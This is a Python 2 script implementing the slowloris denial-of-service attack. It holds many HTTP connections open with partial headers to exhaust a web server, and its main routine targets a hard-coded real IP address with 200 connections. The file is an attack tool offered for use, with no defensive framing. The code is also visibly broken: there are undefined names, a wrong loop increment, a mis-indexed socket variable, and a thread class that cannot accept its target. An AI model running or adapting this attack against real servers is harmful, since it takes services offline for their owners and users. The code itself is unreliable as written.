import socket
import threading
import time

"""
An implementation of the slowloris DDoS attack (as written by
RSnake).

Put the rest of the explanation here
"""

class Loris:
    def __init__(self, addr, port = 80, totalConnections = 50):
        self.addr = addr
        self.port = port
        self.totalConnections = totalConnections

        self.threadList = []
        self.connectionsPerThread = 10
        self.MAX_TIMEOUT = 300

    """
    Begin an attack against the specified host on the specified
    port
    """
    def initiateAttack(self):
        self.timeout = self.findTimeout()
        if self.timeout < 0:
            print "Something is going horribly wrong"
            return

        i = 0
        while i < totalConnections:
            t = KillableThread(target = self.doConnections)
            t.start()
            self.threadList.append(t)
            i += self.totalConnections

    """
    Call this to cancel the attack and free all connections
    """
    def endAttack(self):
        for t in self.threadList:
            t.kill()

    """
    Determine the timeout to be used from this host to the
    target to avoid timing out and losing connections
    """
    def findTimeout(self):
        sock = socket.create_connection((self.addr, self.port))
        payload = "GET HTTP/1.1\r\n" +\
        "Host: " + str(self.addr) + ":" + str(self.port) + "\r\n" +\
        "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
        "Content-Length: 42\r\n"
        if sock is not None:
            try:
                sent = sock.send(payload)
            except:
                print "something went wrong"
                return -1
        for i in range(1, self.MAX_TIMEOUT):
            print "Attempting a " + str(i) + " second timeout"
            time.sleep(i)
            message = "X-a: b\r\n"
            try:
                sent = sock.send(message)
            except socket.error, e:
                print "timeout determined to be " + str(i - 1)
                return i - 1
        return self.MAX_TIMEOUT

    """
    Establish the specified number of connections to the target
    and keep each of them (barely) alive to consume resources
    """
    def doConnections(self):
        working = [False] * self.connectionsPerThread
        sockets = [None]  * self.connectionsPerThread

        while (True):
            if self.killed():
                return

            """ Establish connections """
            for i in range(0, self.connectionsPerThread):
                if not working[i]:
                    try:
                        sockets[i] = socket.create_connection((self.addr, self.port))
                        working[i] = True
                    except:
                        working[i] = False
                if working[i]:
                    payload = "GET HTTP/1.1\r\n" +\
                    "Host: " + str(self.addr) + ":" + str(self.port) + "\r\n" +\
                    "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
                    "Content-Length: 42\r\n"
                    if sockets[i] is not None:
                        try:
                            sockets[i].send(payload)
                        except:
                            working[i] = False

            """ Send data """
            for i in range(0, self.connectionsPerThread):
                if working[i] is True:
                    if sockets[i]:
                        sock = sock[i]
                        message = "X-a: b\r\n"
                        try:
                            sock.send(message)
                        except:
                            working[i] = False

            """ Sleep for timeout """
            time.sleep(self.timeout)

"""
This class exists so that it's possible to call off a DDoS
attack: calling kill() on a thread will set a flag (checked
on a regular basis) that tells the thread to halt execution,
which will in turn free the established connections.
"""
class KillableThread(threading.Thread):

    def __init__(self):
        super(KillableThread, self).__init__()
        self.kill = threading.Event()

    def kill(self):
        self.kill.set()

    def killed(self):
        return self.kill.isSet()

def main():
    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
    loris.initiateAttack()

if __name__ == "__main__":
    main()
